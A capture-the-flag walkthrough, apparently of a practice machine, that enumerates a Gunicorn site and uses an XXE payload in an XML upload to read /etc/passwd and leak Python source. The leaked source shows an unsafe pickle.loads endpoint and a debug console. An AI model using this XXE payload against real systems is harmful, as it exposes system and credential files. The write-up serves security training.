![](./logo.png)

# USER

Performing the nmap scan gives us http page hosted using `Gunicorn`. There is mention of a `dev.solita.fi` backend on the page.

Using gobuster I have found an `upload` endpoint. It provides an xml structure


Uploading the XML below:
```xml
<note>
    <Author>Author</Author>
    <Subject>Subject</Subject>
    <Content>Content</Content>
</note>
```

Provides us with the message:
```
PROCESSED BLOGPOST: Author: Author Subject: Subject Content: Content URL for later reference: /uploads/payload.xml File path: /home/roosa/deploy/src
```

This seems like files go to the `uploads` endpoint. Lets check out if a non xml file goes there.

The parsing of the xml is vulnerable to XML External Entity (XXE Injection) attacks.

With this payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root> 
    <Author>&test;</Author>
    <Subject>Subject</Subject>
    <Content>Content</Content>
</root>
```

We can leak the `/etc/passwd`!

Previously the `feed.py` was mentioned. And we have a leaked file path (/home/roosa/deploy/src). We can use the payload above to leak the `feed.py`


It all comes out unformatted onto the webpage but with a little fixing we get this:
```python
def uploaded_file(filename): 
    return send_from_directory(Config.UPLOAD_FOLDER, filename) 
    
@app.route("/") 
def xss(): 
    return template('index.html') 
    
@app.route("/feed") 
def fakefeed(): 
    return send_from_directory(".","devsolita-snapshot.png") 
    
@app.route("/newpost", methods=["POST"]) 
def newpost(): # TODO: proper save to database, this is for testing purposes right now 
    picklestr = base64.urlsafe_b64decode(request.data) 
    #return picklestr 
    postObj = pickle.loads(picklestr) 
    return "POST RECEIVED: " + postObj['Subject'] ## TODO: VERY important! DISABLED THIS IN PRODUCTION 
    
    # app = DebuggedApplication(app, evalex=True, console_path='/debugconsole') # TODO: Replace run-gunicorn.sh with real Linux service script 
    # app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
    app.run(host='0.0.0,0', Debug=True)
```